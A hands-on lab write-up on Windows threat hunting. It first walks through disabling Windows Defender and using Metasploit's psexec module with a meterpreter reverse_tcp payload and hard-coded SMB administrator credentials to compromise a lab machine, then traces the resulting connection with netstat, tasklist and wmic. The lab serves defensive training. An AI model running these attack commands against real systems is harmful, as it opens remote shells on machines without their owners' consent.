# Windows CLI Lab: Malware Detection and Analysis

### Lab overview

In this hands-on lab, we'll create and execute malware in a controlled environment, then use command-line tools to investigate how an attack manifests on a live Windows system. The most effective way to understand cybersecurity threats is through practical, direct experience. 

Before we proceed, we must ensure that Windows Defender is disabled. To do this, open Windows PowerShell. 

<img width="779" height="355" alt="Screenshot 2025-10-26 at 2 53 26 AM" src="https://github.com/user-attachments/assets/36975b00-3743-4b24-b326-1442c649f4db" />


### Initial Setup. 
Begin by elevating your privileges to root access:

```bash
sudo su -
```

Launch the Metasploit Framework console:

``` bash
msfconsole -q
```

Note: The connection process may take a moment to complete. Please be patient while it initializes.

Once connected, your terminal prompt will change to indicate you're in the Metasploit 2 console.

Configuring the Exploit
Select the Windows SMB exploit module:
``` bash
use exploit/windows/smb/psexec
```

Configure the payload type:
``` bash
set PAYLOAD windows/meterpreter/reverse_tcp
```
<img width="992" height="193" alt="Screenshot 2025-10-26 at 3 00 29 AM" src="https://github.com/user-attachments/assets/c5c49322-c43f-400d-bc7f-467ec417cc0b" />

Specify the target Windows system's IP address:
``` bash
set RHOST (YOUR IP ADDRESS)
```
<img width="996" height="47" alt="Screenshot 2025-10-26 at 3 02 45 AM" src="https://github.com/user-attachments/assets/8eb0555b-5dcd-4db8-ae87-b86987695d39" />

Set the SMB credentials for authentication:
``` bash
set SMBUSER Administrator
set SMBPASS password1234
```
<img width="998" height="65" alt="Screenshot 2025-10-26 at 3 04 22 AM" src="https://github.com/user-attachments/assets/9e51a010-7b0b-4e46-9d63-b26f976782b2" />

Security Note: Use the password you configured earlier in the lab. Ensure you're using a unique password in your environment.

After configuration, your console should display all the set parameters.

Execute the attack:
```bash 
exploit
```
<img width="984" height="146" alt="Screenshot 2025-10-26 at 3 05 55 AM" src="https://github.com/user-attachments/assets/1a42f708-0d47-4c20-b001-b3a10b028800" />


## Network Connection Analysis
While this lab environment is simplified, two critical commands help detect attackers mounting network shares:

* net view - Identifies shares being accessed on remote computers
* net session - Shows shares currently mounted on the local system

## Investigating the Malware Connection
Open a Windows PowerShell window and examine all network connections:
``` powershell
netstat -naob
```
<img width="781" height="625" alt="Screenshot 2025-10-26 at 3 08 00 AM" src="https://github.com/user-attachments/assets/0b5da92c-78f6-4d53-9ec5-6e64e83862d2" />

This command produces extensive output showing:

* Listening ports (0.0.0.0:portnumber or LISTENING status)
* Active connections to remote systems (ESTABLISHED status)

Focus on the ESTABLISHED connections, and the port configured for our malware payload.

For additional context about connection endpoints, use:

``` powershelll# Find all PowerShell processes
netstat -f
```
<img width="788" height="127" alt="Screenshot 2025-10-26 at 3 19 40 AM" src="https://github.com/user-attachments/assets/db4f8149-d38c-4eff-97f9-d1a3cfa4dcb3" />

Find PowerShell Process (Running or Not)
``` powershell# Find all PowerShell processes
Get-Process | Where-Object {$_.ProcessName -like "*powershell*"}
```
<img width="813" height="99" alt="Screenshot 2025-10-26 at 9 19 25 AM" src="https://github.com/user-attachments/assets/74bf3178-bd5e-4530-967a-44521e3420e4" />


This displays fully qualified domain names (FQDNs), helping you identify legitimate connections you can filter out during analysis.

We will start with tasklist:

``` powershell
tasklist /m /fi "pid eq [PID]"
```
<img width="828" height="86" alt="Screenshot 2025-10-26 at 8 56 14 AM" src="https://github.com/user-attachments/assets/4f5bc259-ddb6-4573-b6c9-03d297607f40" />


## Process Investigation

From your earlier netstat -naob output, locate the Process ID (PID) and the powershell.exe process.
The output will show loaded DLLs, though in this case, you won't find much suspicious activity at this level.

Dig deeper using Windows Management Instrumentation Command-line (WMIC):
``` powershell
wmic process where processid=[PID] get commandline
```
<img width="821" height="82" alt="Screenshot 2025-10-26 at 9 02 28 AM" src="https://github.com/user-attachments/assets/b44dbfff-2711-4312-9ca5-9b799efd6f8a" />


This reveals that the malicious file was launched directly from the command line without any parameters—a significant indicator of suspicious activity.

Identify the parent process that spawned your malware:
``` powershell
wmic process get name,parentprocessid,processid | select-string [PID]
```
<img width="814" height="134" alt="Screenshot 2025-10-26 at 9 05 09 AM" src="https://github.com/user-attachments/assets/8d860dbb-f60a-4b75-88f3-8f6ae4c06d87" />

## Investigation Summary
Through this systematic investigation, you've completed the following detection steps:

✅ Identified the malicious network connection (port 4444)

✅ Located the associated process ID

✅ Examined the process command line

✅ Traced back to the parent process ID

✅ Discovered the malware was launched via cmd.exe

Note: Your search may return additional processes launched by the command line interpreter, this is normal and reflects typical system activity.

This methodology demonstrates the fundamental process of threat hunting: starting with network indicators and systematically tracing back to the initial point of compromise.
